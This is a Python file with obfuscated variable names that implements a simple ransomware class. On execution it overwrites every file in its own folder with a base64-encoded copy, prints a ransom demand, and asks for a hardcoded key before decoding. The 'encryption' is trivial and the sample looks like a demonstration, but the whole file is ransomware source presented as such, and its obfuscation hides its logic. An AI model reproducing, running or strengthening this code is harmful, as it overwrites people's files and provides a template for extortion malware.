import logging 	
import os 	
import sys 	
import base64 	
class Ransomware :	
    ""	
    def __init__ (OO0OOOOO0OOOOO0OO ,O0O0O0O00O0000000 ):	
        OO0OOOOO0OOOOO0OO ._name =O0O0O0O00O0000000 	
    @property 	
    def name (OO00O0O00OOO0O00O ):	
        ""	
        return OO00O0O00OOO0O00O ._name 	
    @name .setter 	
    def name (OOO0OOO0OO0O0OOOO ,OO0O0O00OO000O00O ):	
        OOO0OOO0OO0O0OOOO ._name =OO0O0O00OO000O00O 	
    @property 	
    def key (OOO0O0OOO00000OOO ):	
        ""	
        return "__ransomware_key"	
    def obtain_key (O000O0OOO000O0O0O ):	
        ""	
        return input ("Please enter a key: ")	
    def ransom_user (O0OO0O000O0O00000 ):	
        ""	
        print ("Hi, all your files has been encrypted. Please " "send 0.1 USD on this address to get decryption" " key: XYZ.")	
    def encrypt_file (OOOO0O0000OOO0OOO ,O000OO0OO0O0O0000 ):	
        ""	
        with open (O000OO0OO0O0O0000 ,'r')as O0O0O00000OO000O0 :	
            OOOOO00OO0000O0OO =O0O0O00000OO000O0 .read ()	
        O0OOO0000OOOOO0O0 =base64 .b64encode (OOOOO00OO0000O0OO .encode ('utf-8'))	
        with open (O000OO0OO0O0O0000 ,'w')as O0O0O00000OO000O0 :	
            O0O0O00000OO000O0 .write (O0OOO0000OOOOO0O0 .decode ('utf-8'))	
    def decrypt_file (O0OO0OOOOOO0OOOOO ,OOO00OOOO0OOOO000 ,OOOOO00OOO0OO000O ):	
        ""	
        with open (OOOOO00OOO0OO000O ,'r')as O0O0OO00O0OO0OOO0 :	
            O00OOOO0OO0000O0O =O0O0OO00O0OO0OOO0 .read ()	
        OOO000OOO0000O0O0 =base64 .b64decode (O00OOOO0OO0000O0O )	
        with open (OOOOO00OOO0OO000O ,'w')as O0O0OO00O0OO0OOO0 :	
            O00OOOO0OO0000O0O =O0O0OO00O0OO0OOO0 .write (OOO000OOO0000O0O0 .decode ('utf-8'))	
    def get_files_in_folder (OOO0O0O0OOO0OOO0O ,O00OOO000OOOO0000 ):	
        ""	
        O0OO0000O0OO0OO0O =[]	
        for O000OO0OOO0OOO00O in os .listdir (O00OOO000OOOO0000 ):	
            if O000OO0OOO0OOO00O =='README.md'or O000OO0OOO0OOO00O ==sys .argv [0 ]:	
                continue 	
            OOO0OO000O00OO00O =os .path .join (O00OOO000OOOO0000 ,O000OO0OOO0OOO00O )	
            if os .path .isfile (OOO0OO000O00OO00O ):	
                O0OO0000O0OO0OO0O .append (OOO0OO000O00OO00O )	
        return O0OO0000O0OO0OO0O 	
    def encrypt_files_in_folder (O0O00O0OO0OOOO0OO ,O00O0O0000O00000O ):	
        ""	
        O000OO0000OOOO000 =0 	
        OO000O0OOO0O00O00 =O0O00O0OO0OOOO0OO .get_files_in_folder (O00O0O0000O00000O )	
        for OO0OOO0O000O0O00O in OO000O0OOO0O00O00 :	
            logging .debug ('Encrypting file: {}'.format (OO0OOO0O000O0O00O ))	
            O0O00O0OO0OOOO0OO .encrypt_file (OO0OOO0O000O0O00O )	
            O000OO0000OOOO000 +=1 	
        O0O00O0OO0OOOO0OO .ransom_user ()	
        return O000OO0000OOOO000 	
    def decrypt_files_in_folder (O0O00OO0OOO00OO0O ,O0000OO00O0OOOO0O ):	
        ""	
        O0000O000OOO00O00 =O0O00OO0OOO00OO0O .obtain_key ()	
        if O0000O000OOO00O00 !=O0O00OO0OOO00OO0O .key :	
            print ('Wrong key!')	
            return 	
        O0O0000O0OOOO0OO0 =O0O00OO0OOO00OO0O .get_files_in_folder (O0000OO00O0OOOO0O )	
        for O0O00OO0O00OOO0OO in O0O0000O0OOOO0OO0 :	
            O0O00OO0OOO00OO0O .decrypt_file (O0000O000OOO00O00 ,O0O00OO0O00OOO0OO )	
if __name__ =='__main__':	
    logging .basicConfig (level =logging .DEBUG )	
    ransomware =Ransomware ('SimpleRansomware')	
    path =os .path .dirname (os .path .abspath (__file__ ))	
    number_encrypted_files =ransomware .encrypt_files_in_folder (path )	
    print ('Number of encrypted files: {}'.format (number_encrypted_files ))	
    ransomware .decrypt_files_in_folder (path )